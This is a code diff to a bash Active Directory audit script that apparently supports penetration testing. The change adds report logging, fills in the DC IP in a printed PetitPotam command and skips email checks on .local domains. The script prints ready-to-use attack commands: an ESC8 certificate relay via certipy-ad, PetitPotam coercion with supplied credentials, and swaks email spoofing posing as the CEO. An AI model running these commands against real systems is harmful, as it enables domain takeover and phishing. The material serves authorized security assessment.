@@ -106,6 +106,7 @@ fi
 CURRENT_PATH=$(pwd)
 OUTPUT_DIR="$CURRENT_PATH/fkad_${DOMAIN}_$(date +%Y%m%d_%H%M)"
 mkdir -p "$OUTPUT_DIR"
+exec > >(tee "$OUTPUT_DIR/fkad_report.txt") 2>&1
 
 echo -e "${BLUE}[*] DC FQDN   : ${DC_FQDN}${NC}"
 echo -e "${BLUE}[*] DC IP     : $DC_IP${NC}"
@@ -224,7 +225,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
             FIRST_DC_TEMPLATE=$(echo "$DC_TEMPLATES" | cut -d',' -f1)
             echo -e "${GREY}       └─ ESC8 - DC Templates: ${DC_TEMPLATES}${NC}"
             echo -e "${GREY}          1) certipy-ad relay -target https://${CA_IP}/certsrv/certfnsh.asp -ca ${CA_HOST%%.*} -template ${FIRST_DC_TEMPLATE}${NC}"
-            echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <TARGET_DC>${NC}"
+            echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
             echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
           fi
         fi
@@ -708,22 +709,27 @@ else
 fi
 
 # Email Security (SPF/DMARC)
-SPF_CHECK=$(dig txt $DOMAIN +short 2>/dev/null | grep "v=spf1")
-DMARC_CHECK=$(dig txt _dmarc.$DOMAIN +short 2>/dev/null | grep "v=DMARC1")
-MX_SERVER=$(dig mx $DOMAIN +short 2>/dev/null | sort -n | head -1 | awk '{print $2}' | sed 's/\.$//')
-
-if [ -z "$SPF_CHECK" ] && [ -z "$DMARC_CHECK" ]; then
-  echo -e "${RED}[KO] No SPF + No DMARC (Email Spoofing possible)${NC}"
-  echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
-elif [ -z "$SPF_CHECK" ]; then
-  echo -e "${RED}[KO] No SPF record (Email Spoofing possible)${NC}"
-  echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
-elif [ -z "$DMARC_CHECK" ]; then
-  echo -e "${RED}[KO] No DMARC record (SPF without enforcement, no spoofing possible)${NC}"
+if [[ "$DOMAIN" == *.local ]]; then
+  echo -e "${GREY}[--] Email Security: Skipped (.local domain, internal only)${NC}"
 else
-  echo -e "${GREEN}[OK] SPF + DMARC configured${NC}"
+  SPF_CHECK=$(dig txt $DOMAIN +short 2>/dev/null | grep "v=spf1")
+  DMARC_CHECK=$(dig txt _dmarc.$DOMAIN +short 2>/dev/null | grep "v=DMARC1")
+  MX_SERVER=$(dig mx $DOMAIN +short 2>/dev/null | sort -n | head -1 | awk '{print $2}' | sed 's/\.$//')
+  
+  if [ -z "$SPF_CHECK" ] && [ -z "$DMARC_CHECK" ]; then
+    echo -e "${RED}[KO] No SPF + No DMARC (Email Spoofing possible)${NC}"
+    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
+  elif [ -z "$SPF_CHECK" ]; then
+    echo -e "${RED}[KO] No SPF record (Email Spoofing possible)${NC}"
+    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
+  elif [ -z "$DMARC_CHECK" ]; then
+    echo -e "${RED}[KO] No DMARC record (SPF without enforcement, no spoofing possible)${NC}"
+  else
+    echo -e "${GREEN}[OK] SPF + DMARC configured${NC}"
+  fi
 fi
 
 echo ""
+echo -e "${GREEN}[OK] Full report saved → fkad_report.txt${NC}"
 echo -e "${GREY}[--] Copy results to host: docker cp ${CONTAINER_NAME}:${OUTPUT_DIR} ~/Downloads/${NC}"
 echo ""
